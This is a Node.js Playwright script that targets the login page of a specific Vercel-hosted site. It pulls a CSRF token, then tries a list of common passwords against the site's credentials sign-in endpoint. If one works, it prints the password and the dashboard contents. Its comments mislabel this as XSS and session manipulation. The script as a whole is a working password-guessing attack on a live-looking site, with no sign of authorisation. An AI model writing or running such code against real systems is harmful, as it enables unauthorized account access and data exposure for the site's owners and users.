const { chromium } = require('playwright');

(async () => {
    const browser = await chromium.launch({ headless: true });
    const context = await browser.newContext();
    const page = await context.newPage();
    
    // Collect all console messages
    page.on('console', msg => console.log('BROWSER:', msg.text()));
    
    // Navigate
    await page.goto('https://sturdy-octo-memory-three.vercel.app/login');
    await page.waitForTimeout(2000);
    
    // Get CSRF
    const csrf = await page.evaluate(async () => {
        const res = await fetch('/api/auth/csrf');
        return (await res.json()).csrfToken;
    });
    console.log("CSRF:", csrf);
    
    // Try to inject a session via XSS
    console.log("\nAttempting to create session via XSS...");
    const sessionResult = await page.evaluate(async (csrfToken) => {
        // Try various passwords
        const passwords = ['admin', 'password', '123456', 'test', 'shop', 'demo'];
        
        for (const pwd of passwords) {
            const res = await fetch('/api/auth/callback/credentials', {
                method: 'POST',
                headers: { 'Content-Type': 'application/x-www-form-urlencoded' },
                body: `password=${encodeURIComponent(pwd)}&redirect=false&csrfToken=${csrfToken}&callbackUrl=${encodeURIComponent(window.location.origin)}&json=true`
            });
            
            const data = await res.json();
            if (data.url && !data.url.includes('signin')) {
                return { success: true, password: pwd, url: data.url };
            }
        }
        return { success: false };
    }, csrf);
    
    console.log("Session result:", sessionResult);
    
    // If we got a URL, navigate there
    if (sessionResult.success) {
        console.log("\n[!!!] PASSWORD FOUND:", sessionResult.password);
        await page.goto(sessionResult.url);
        await page.waitForTimeout(2000);
        
        const pageText = await page.evaluate(() => document.body.innerText);
        console.log("\nDASHBOARD CONTENT:");
        console.log(pageText);
    } else {
        // Try to access dashboard directly via session manipulation
        console.log("\nTrying session manipulation...");
        
        // Use XSS to check session
        const sessionCheck = await page.evaluate(async () => {
            const res = await fetch('/api/auth/session');
            return await res.json();
        });
        console.log("Current session:", sessionCheck);
    }
    
    await browser.close();
})();
